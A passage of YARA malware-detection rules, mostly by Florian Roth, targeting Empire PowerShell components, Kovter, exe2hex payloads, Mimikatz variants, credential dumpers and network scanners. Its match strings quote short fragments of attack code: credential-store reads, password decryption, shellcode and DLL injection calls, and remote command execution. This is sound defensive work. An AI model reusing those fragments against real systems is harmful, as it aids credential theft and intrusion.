      ( uint16(0) == 0x233c and filesize < 2000KB and 1 of them ) or all of them
}

rule Empire_Invoke_Mimikatz_Gen {
   meta:
      description = "Detects Empire component - file Invoke-Mimikatz.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3"
   strings:
      $s1 = "= \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQ" ascii
      $s2 = "Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs)" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them
}

rule Empire_Get_GPPPassword {
   meta:
      description = "Detects Empire component - file Get-GPPPassword.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "55a4519c4f243148a971e4860225532a7ce730b3045bde3928303983ebcc38b0"
   strings:
      $s1 = "$Base64Decoded = [Convert]::FromBase64String($Cpassword)" fullword ascii
      $s2 = "$XMlFiles += Get-ChildItem -Path \"\\\\$DomainController\\SYSVOL\" -Recurse" ascii
      $s3 = "function Get-DecryptedCpassword {" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
}

rule Empire_Invoke_SmbScanner {
   meta:
      description = "Detects Empire component - file Invoke-SmbScanner.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "9a705f30766279d1e91273cfb1ce7156699177a109908e9a986cc2d38a7ab1dd"
   strings:
      $s1 = "$up = Test-Connection -count 1 -Quiet -ComputerName $Computer " fullword ascii
      $s2 = "$out | add-member Noteproperty 'Password' $Password" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 10KB and 1 of them ) or all of them
}

rule Empire_Exploit_JBoss {
   meta:
      description = "Detects Empire component - file Exploit-JBoss.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "9ea3e00b299e644551d90bbee0ce3e4e82445aa15dab7adb7fcc0b7f1fe4e653"
   strings:
      $s1 = "Exploit-JBoss" fullword ascii
      $s2 = "$URL = \"http$($SSL)://\" + $($Rhost) + ':' + $($Port)" ascii
      $s3 = "\"/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service" ascii
      $s4 = "http://blog.rvrsh3ll.net" fullword ascii
      $s5 = "Remote URL to your own WARFile to deploy." fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 10KB and 1 of them ) or all of them
}

rule Empire_dumpCredStore {
   meta:
      description = "Detects Empire component - file dumpCredStore.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "c1e91a5f9cc23f3626326dab2dcdf4904e6f8a332e2bce8b9a0854b371c2b350"
   strings:
      $x1 = "[DllImport(\"Advapi32.dll\", SetLastError = true, EntryPoint = \"CredReadW\"" ascii
      $s12 = "[String] $Msg = \"Failed to enumerate credentials store for user '$Env:UserName'\"" fullword ascii
      $s15 = "Rtn = CredRead(\"Target\", CRED_TYPE.GENERIC, out Cred);" fullword ascii
   condition:
      ( uint16(0) == 0x233c and filesize < 40KB and 1 of them ) or all of them
}

rule Empire_Invoke_EgressCheck {
   meta:
      description = "Detects Empire component - file Invoke-EgressCheck.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "e2d270266abe03cfdac66e6fc0598c715e48d6d335adf09a9ed2626445636534"
   strings:
      $s1 = "egress -ip $ip -port $c -delay $delay -protocol $protocol" fullword ascii
   condition:
      ( uint16(0) == 0x233c and filesize < 10KB and 1 of them ) or all of them
}

rule Empire_ReflectivePick_x64_orig {
   meta:
      description = "Detects Empire component - file ReflectivePick_x64_orig.dll"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "a8c1b108a67e7fc09f81bd160c3bafb526caf3dbbaf008efb9a96f4151756ff2"
   strings:
      $s1 = "\\PowerShellRunner.pdb" fullword ascii
      $s2 = "PowerShellRunner.dll" fullword wide
      $s3 = "ReflectivePick_x64.dll" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and 1 of them ) or all of them
}

rule Empire_Out_Minidump {
   meta:
      description = "Detects Empire component - file Out-Minidump.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "7803ae7ba5d4e7d38e73745b3f321c2ca714f3141699d984322fa92e0ff037a1"
   strings:
      $s1 = "$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle," fullword ascii
      $s2 = "$ProcessFileName = \"$($ProcessName)_$($ProcessId).dmp\"" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 10KB and 1 of them ) or all of them
}

rule Empire_Invoke_PsExec {
   meta:
      description = "Detects Empire component - file Invoke-PsExec.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "0218be4323959fc6379489a6a5e030bb9f1de672326e5e5b8844ab5cedfdcf88"
   strings:
      $s1 = "Invoke-PsExecCmd" fullword ascii
      $s2 = "\"[*] Executing service .EXE" fullword ascii
      $s3 = "$cmd = \"%COMSPEC% /C echo $Command ^> %systemroot%\\Temp\\" ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 50KB and 1 of them ) or all of them
}

rule Empire_Invoke_PostExfil {
   meta:
      description = "Detects Empire component - file Invoke-PostExfil.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "00c0479f83c3dbbeff42f4ab9b71ca5fe8cd5061cb37b7b6861c73c54fd96d3e"
   strings:
      $s1 = "# upload to a specified exfil URI" fullword ascii
      $s2 = "Server path to exfil to." fullword ascii
   condition:
      ( uint16(0) == 0x490a and filesize < 2KB and 1 of them ) or all of them
}

rule Empire_Invoke_SMBAutoBrute {
   meta:
      description = "Detects Empire component - file Invoke-SMBAutoBrute.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "7950f8abdd8ee09ed168137ef5380047d9d767a7172316070acc33b662f812b2"
   strings:
      $s1 = "[*] PDC: LAB-2008-DC1.lab.com" fullword ascii
      $s2 = "$attempts = Get-UserBadPwdCount $userid $dcs" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
}

rule Empire_Get_Keystrokes {
   meta:
      description = "Detects Empire component - file Get-Keystrokes.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "c36e71db39f6852f78df1fa3f67e8c8a188bf951e96500911e9907ee895bf8ad"
   strings:
      $s1 = "$RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
}

rule Empire_Invoke_DllInjection {
   meta:
      description = "Detects Empire component - file Invoke-DllInjection.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "304031aa9eca5a83bdf1f654285d86df79cb3bba4aa8fe1eb680bd5b2878ebf0"
   strings:
      $s1 = "-Dll evil.dll" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 40KB and 1 of them ) or all of them
}

rule Empire_KeePassConfig {
   meta:
      description = "Detects Empire component - file KeePassConfig.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "5a76e642357792bb4270114d7cd76ce45ba24b0d741f5c6b916aeebd45cff2b3"
   strings:
      $s1 = "$UserMasterKeyFiles = @(, $(Get-ChildItem -Path $UserMasterKeyFolder -Force | Select-Object -ExpandProperty FullName) )" fullword ascii
   condition:
      ( uint16(0) == 0x7223 and filesize < 80KB and 1 of them ) or all of them
}

rule Empire_Invoke_SSHCommand {
   meta:
      description = "Detects Empire component - file Invoke-SSHCommand.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "cbaf086b14d5bb6a756cbda42943d4d7ef97f8277164ce1f7dd0a1843e9aa242"
   strings:
      $s1 = "$Base64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAA" ascii
      $s2 = "Invoke-SSHCommand -ip 192.168.1.100 -Username root -Password test -Command \"id\"" fullword ascii
      $s3 = "Write-Verbose \"[*] Error loading dll\"" fullword ascii
   condition:
      ( uint16(0) == 0x660a and filesize < 2000KB and 1 of them ) or all of them
}

/* Super Rules ------------------------------------------------------------- */

rule Empire_PowerShell_Framework_Gen1 {
   meta:
      description = "Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-DCSync.ps1, Invoke-Mimikatz.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      super_rule = 1
      hash1 = "1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8"
      hash2 = "a3428a7d4f9e677623fadff61b2a37d93461123535755ab0f296aa3b0396eb28"
      hash3 = "4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3"
      hash4 = "61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4"
      hash5 = "eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5"
   strings:
      $s1 = "Write-BytesToMemory -Bytes $Shellcode" ascii
      $s2 = "$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them
}

rule Empire_PowerUp_Gen {
   meta:
      description = "Detects Empire component - from files PowerUp.ps1, PowerUp.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      super_rule = 1
      hash1 = "ad9a5dff257828ba5f15331d59dd4def3989537b3b6375495d0c08394460268c"
   strings:
      $s1 = "$Result = sc.exe config $($TargetService.Name) binPath= $OriginalPath" fullword ascii
      $s2 = "$Result = sc.exe pause $($TargetService.Name)" fullword ascii
   condition:
      ( uint16(0) == 0x233c and filesize < 2000KB and 1 of them ) or all of them
}

rule Empire_PowerShell_Framework_Gen2 {
   meta:
      description = "Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-CredentialInjection.ps1, Invoke-DCSync.ps1, Invoke-DCSync.ps1, Invoke-Mimikatz.ps1, Invoke-PSInject.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1, Invoke-ReflectivePEInjection.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      super_rule = 1
      hash1 = "1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8"
      hash3 = "a3428a7d4f9e677623fadff61b2a37d93461123535755ab0f296aa3b0396eb28"
      hash5 = "4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3"
      hash6 = "61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4"
      hash8 = "eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5"
   strings:
      $x1 = "$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)" fullword ascii
      $s20 = "#Shellcode: CallDllMain.asm" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them
}

rule Empire_Agent_Gen {
   meta:
      description = "Detects Empire component - from files agent.ps1, agent.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      super_rule = 1
      hash1 = "380fd09bfbe47d5c8c870c1c97ff6f44982b699b55b61e7c803d3423eb4768db"
      hash2 = "380fd09bfbe47d5c8c870c1c97ff6f44982b699b55b61e7c803d3423eb4768db"
   strings:
      $s1 = "$wc.Headers.Add(\"User-Agent\",$script:UserAgent)" fullword ascii
      $s2 = "$min = [int]((1-$script:AgentJitter)*$script:AgentDelay)" fullword ascii
      $s3 = "if ($script:AgentDelay -ne 0){" fullword ascii
   condition:
      ( uint16(0) == 0x660a and filesize < 100KB and 1 of them ) or all of them
}

rule Empire_PowerShell_Framework_Gen3 {
   meta:
      description = "Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-Mimikatz.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      super_rule = 1
      hash1 = "1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8"
      hash2 = "4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3"
      hash3 = "61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4"
      hash4 = "eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5"
   strings:
      $s1 = "if (($PEInfo.FileType -ieq \"DLL\") -and ($RemoteProcHandle -eq [IntPtr]::Zero))" fullword ascii
      $s2 = "remote DLL injection" ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them
}

rule Empire_Invoke_InveighRelay_Gen {
   meta:
      description = "Detects Empire component - from files Invoke-InveighRelay.ps1, Invoke-InveighRelay.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      super_rule = 1
      hash2 = "21b90762150f804485219ad36fa509aeda210d46453307a9761c816040312f41"
   strings:
      $s1 = "$inveigh.SMBRelay_failed_list.Add(\"$HTTP_NTLM_domain_string\\$HTTP_NTLM_user_string $SMBRelayTarget\")" fullword ascii
      $s2 = "$NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 200KB and 1 of them ) or all of them
}

rule Empire_KeePassConfig_Gen {
   meta:
      description = "Detects Empire component - from files KeePassConfig.ps1, KeePassConfig.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      super_rule = 1
      hash2 = "5a76e642357792bb4270114d7cd76ce45ba24b0d741f5c6b916aeebd45cff2b3"
   strings:
      $s1 = "$KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)" fullword ascii
   condition:
      ( uint16(0) == 0x7223 and filesize < 80KB and 1 of them ) or all of them
}

rule Empire_Invoke_Portscan_Gen {
   meta:
      description = "Detects Empire component - from files Invoke-Portscan.ps1, Invoke-Portscan.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      super_rule = 1
      hash2 = "cf7030be01fab47e79e4afc9e0d4857479b06a5f68654717f3bc1bc67a0f38d3"
   strings:
      $s1 = "Test-Port -h $h -p $Port -timeout $Timeout" fullword ascii
      $s2 = "1 {$nHosts=10;  $Threads = 32;   $Timeout = 5000 }" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 100KB and 1 of them ) or all of them
}

rule Empire_PowerShell_Framework_Gen4 {
   meta:
      description = "Detects Empire component - from files Invoke-BypassUAC.ps1, Invoke-CredentialInjection.ps1, Invoke-CredentialInjection.ps1, Invoke-DCSync.ps1, Invoke-DllInjection.ps1, Invoke-Mimikatz.ps1, Invoke-PsExec.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1, Invoke-Shellcode.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      super_rule = 1
      hash1 = "743c51334f17751cfd881be84b56f648edbdaf31f8186de88d094892edc644a9"
      hash2 = "1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8"
      hash3 = "1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8"
      hash4 = "a3428a7d4f9e677623fadff61b2a37d93461123535755ab0f296aa3b0396eb28"
      hash5 = "304031aa9eca5a83bdf1f654285d86df79cb3bba4aa8fe1eb680bd5b2878ebf0"
      hash6 = "4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3"
      hash7 = "0218be4323959fc6379489a6a5e030bb9f1de672326e5e5b8844ab5cedfdcf88"
      hash8 = "61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4"
      hash9 = "eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5"
      hash10 = "fa75cfd57269fbe3ad6bdc545ee57eb19335b0048629c93f1dc1fe1059f60438"
   strings:
      $s1 = "Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }" fullword ascii
      $s2 = "# Get a handle to the module specified" fullword ascii
      $s3 = "$Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))" fullword ascii
      $s4 = "$DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them
}

rule Empire_Invoke_CredentialInjection_Invoke_Mimikatz_Gen {
   meta:
      description = "Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-Mimikatz.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      super_rule = 1
      hash1 = "1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8"
      hash2 = "4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3"
   strings:
      $s1 = "$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle" fullword ascii
      $s2 = "$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them
}

rule Empire_Invoke_Gen {
   meta:
      description = "Detects Empire component - from files Invoke-DCSync.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      super_rule = 1
      hash1 = "a3428a7d4f9e677623fadff61b2a37d93461123535755ab0f296aa3b0396eb28"
      hash2 = "61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4"
      hash3 = "eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5"
   strings:
      $s1 = "$Shellcode1 += 0x48" fullword ascii
      $s2 = "$PEHandle = [IntPtr]::Zero" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 3000KB and 1 of them ) or all of them
}

rule Empire_PowerShell_Framework_Gen5 {
   meta:
      description = "Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      super_rule = 1
      hash1 = "1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8"
      hash2 = "61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4"
      hash3 = "eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5"
   strings:
      $s1 = "if ($ExeArgs -ne $null -and $ExeArgs -ne '')" fullword ascii
      $s2 = "$ExeArgs = \"ReflectiveExe $ExeArgs\"" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 1000KB and 1 of them ) or all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

rule Kovter
{ 
	meta:
		maltype = "Kovter"
    reference = "http://blog.airbuscybersecurity.com/post/2016/03/FILELESS-MALWARE-%E2%80%93-A-BEHAVIOURAL-ANALYSIS-OF-KOVTER-PERSISTENCE"
		date = "9-19-2016"
		description = "fileless malware"
	strings:
		$type="Microsoft-Windows-Security-Auditing" wide ascii
		$eventid="4688" wide ascii
		$data="Windows\\System32\\regsvr32.exe" wide ascii
		
		$type1="Microsoft-Windows-Security-Auditing" wide ascii
		$eventid1="4689" wide ascii
		$data1="Windows\\System32\\mshta.exe" wide ascii
		
		$type2="Microsoft-Windows-Security-Auditing" wide ascii
		$eventid2="4689" wide ascii
		$data2="Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" wide ascii

		$type3="Microsoft-Windows-Security-Auditing" wide ascii
		$eventid3="4689" wide ascii
		$data3="Windows\\System32\\wbem\\WmiPrvSE.exe" wide ascii


	condition:
		all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-01-15
	Identifier: Exe2hex
*/

rule Payload_Exe2Hex : toolkit {
	meta:
		description = "Detects payload generated by exe2hex"
		author = "Florian Roth"
		reference = "https://github.com/g0tmi1k/exe2hex"
		date = "2016-01-15"
		score = 70
	strings:
		$a1 = "set /p \"=4d5a" ascii
		$a2 = "powershell -Command \"$hex=" ascii
		$b1 = "set+%2Fp+%22%3D4d5" ascii
		$b2 = "powershell+-Command+%22%24hex" ascii
		$c1 = "echo 4d 5a " ascii
		$c2 = "echo r cx >>" ascii
		$d1 = "echo+4d+5a+" ascii
		$d2 = "echo+r+cx+%3E%3E" ascii
	condition:
		all of ($a*) or all of ($b*) or all of ($c*) or all of ($d*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.
*/

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-02-05
	Identifier: Powerkatz
*/

rule Powerkatz_DLL_Generic {
	meta:
		description = "Detects Powerkatz - a Mimikatz version prepared to run in memory via Powershell (overlap with other Mimikatz versions is possible)"
		author = "Florian Roth"
		reference = "PowerKatz Analysis"
		date = "2016-02-05"
		super_rule = 1
		score = 80
		hash1 = "c20f30326fcebad25446cf2e267c341ac34664efad5c50ff07f0738ae2390eae"
		hash2 = "1e67476281c1ec1cf40e17d7fc28a3ab3250b474ef41cb10a72130990f0be6a0"
		hash3 = "49e7bac7e0db87bf3f0185e9cf51f2539dbc11384fefced465230c4e5bce0872"
	strings:
		$s1 = "%3u - Directory '%s' (*.kirbi)" fullword wide
		$s2 = "%*s  pPublicKey         : " fullword wide
		$s3 = "ad_hoc_network_formed" fullword wide
		$s4 = "<3 eo.oe ~ ANSSI E>" fullword wide
		$s5 = "\\*.kirbi" fullword wide

		$c1 = "kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x%08x)" fullword wide
		$c2 = "kuhl_m_lsadump_getComputerAndSyskey ; kuhl_m_lsadump_getSyskey KO" fullword wide
	condition:
		( uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them ) or 2 of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

/*

   THOR APT Scanner - Hack Tool Extract
   This rulset is a subset of all hack tool rules included in our
   APT Scanner THOR - the full featured APT scanner.

   We will frequently update this file with new rules rated TLP:WHITE

   Florian Roth
   BSK Consulting GmbH
   Web: bsk-consulting.de

   revision: 20150510

   License: Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)
	Copyright and related rights waived via https://creativecommons.org/licenses/by-nc-sa/4.0/

*/

/* WCE */

rule WindowsCredentialEditor
{
    meta:
    	description = "Windows Credential Editor" threat_level = 10 score = 90
    strings:
		$a = "extract the TGT session key"
		$b = "Windows Credentials Editor"
    condition:
    	$a or $b
}

rule Amplia_Security_Tool
{
    meta:
		description = "Amplia Security Tool"
		score = 60
		nodeepdive = 1
    strings:
		$a = "Amplia Security"
		$b = "Hernan Ochoa"
		$c = "getlsasrvaddr.exe"
		$d = "Cannot get PID of LSASS.EXE"
		$e = "extract the TGT session key"
		$f = "PPWDUMP_DATA"
    condition: 1 of them
}

/* pwdump/fgdump */

rule PwDump
{
	meta:
		description = "PwDump 6 variant"
		author = "Marc Stroebel"
		date = "2014-04-24"
		score = 70
	strings:
		$s5 = "Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineNa"
		$s6 = "Unable to query service status. Something is wrong, please manually check the st"
		$s7 = "pwdump6 Version %s by fizzgig and the mighty group at foofus.net" fullword
	condition:
		all of them
}

rule PScan_Portscan_1 {
	meta:
		description = "PScan - Port Scanner"
		author = "F. Roth"
		score = 50
	strings:
		$a = "00050;0F0M0X0a0v0}0"
		$b = "vwgvwgvP76"
		$c = "Pr0PhOFyP"
	condition:
		all of them
}

rule HackTool_Samples {
	meta:
		description = "Hacktool"
		score = 50
	strings:
		$a = "Unable to uninstall the fgexec service"
		$b = "Unable to set socket to sniff"
		$c = "Failed to load SAM functions"
		$d = "Dump system passwords"
		$e = "Error opening sam hive or not valid file"
		$f = "Couldn't find LSASS pid"
		$g = "samdump.dll"
		$h = "WPEPRO SEND PACKET"
		$i = "WPE-C1467211-7C89-49c5-801A-1D048E4014C4"
		$j = "Usage: unshadow PASSWORD-FILE SHADOW-FILE"
		$k = "arpspoof\\Debug"
		$l = "Success: The log has been cleared"
		$m = "clearlogs [\\\\computername"
		$n = "DumpUsers 1."
		$o = "dictionary attack with specified dictionary file"
		$p = "by Objectif Securite"
		$q = "objectif-securite"
		$r = "Cannot query LSA Secret on remote host"
		$s = "Cannot write to process memory on remote host"
		$t = "Cannot start PWDumpX service on host"
		$u = "usage: %s <system hive> <security hive>"
		$v = "username:domainname:LMhash:NThash"
		$w = "<server_name_or_ip> | -f <server_list_file> [username] [password]"
		$x = "Impersonation Tokens Available"
		$y = "failed to parse pwdump format string"
		$z = "Dumping password"
	condition:
		1 of them
}

/* Disclosed hack tool set */

rule Fierce2
{
	meta:
		author = "Florian Roth"
		description = "This signature detects the Fierce2 domain scanner"
		date = "07/2014"
		score = 60
	strings:
		$s1 = "$tt_xml->process( 'end_domainscan.tt', $end_domainscan_vars,"
	condition:
		1 of them
}

rule Ncrack
{
	meta:
		author = "Florian Roth"
		description = "This signature detects the Ncrack brute force tool"
		date = "07/2014"
		score = 60
	strings:
		$s1 = "NcrackOutputTable only supports adding up to 4096 to a cell via"
	condition:
		1 of them
}

rule SQLMap
{
	meta:
		author = "Florian Roth"
		description = "This signature detects the SQLMap SQL injection tool"
		date = "07/2014"
		score = 60
	strings:
		$s1 = "except SqlmapBaseException, ex:"
	condition:
		1 of them
}

rule PortScanner {
	meta:
		description = "Auto-generated rule on file PortScanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "b381b9212282c0c650cb4b0323436c63"
	strings:
		$s0 = "Scan Ports Every"
		$s3 = "Scan All Possible Ports!"
	condition:
		all of them
}

rule DomainScanV1_0 {
	meta:
		description = "Auto-generated rule on file DomainScanV1_0.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "aefcd73b802e1c2bdc9b2ef206a4f24e"
	strings:
		$s0 = "dIJMuX$aO-EV"
		$s1 = "XELUxP\"-\\"
		$s2 = "KaR\"U'}-M,."
		$s3 = "V.)\\ZDxpLSav"
		$s4 = "Decompress error"
		$s5 = "Can't load library"
		$s6 = "Can't load function"
		$s7 = "com0tl32:.d"
	condition:
		all of them
}

rule MooreR_Port_Scanner {
	meta:
		description = "Auto-generated rule on file MooreR Port Scanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "376304acdd0b0251c8b19fea20bb6f5b"
	strings:
		$s0 = "Description|"
		$s3 = "soft Visual Studio\\VB9yp"
		$s4 = "adj_fptan?4"
		$s7 = "DOWS\\SyMem32\\/o"
	condition:
		all of them
}

rule NetBIOS_Name_Scanner {
	meta:
		description = "Auto-generated rule on file NetBIOS Name Scanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "888ba1d391e14c0a9c829f5a1964ca2c"
	strings:
		$s0 = "IconEx"
		$s2 = "soft Visual Stu"
		$s4 = "NBTScanner!y&"
	condition:
		all of them
}

rule FeliksPack3___Scanners_ipscan {
	meta:
		description = "Auto-generated rule on file ipscan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "6c1bcf0b1297689c8c4c12cc70996a75"
	strings:
		$s2 = "WCAP;}ECTED"
		$s4 = "NotSupported"
		$s6 = "SCAN.VERSION{_"
	condition:
		all of them
}

rule CGISscan_CGIScan {
	meta:
		description = "Auto-generated rule on file CGIScan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "338820e4e8e7c943074d5a5bc832458a"
	strings:
		$s1 = "Wang Products" fullword wide
		$s2 = "WSocketResolveHost: Cannot convert host address '%s'"
		$s3 = "tcp is the only protocol supported thru socks server"
	condition:
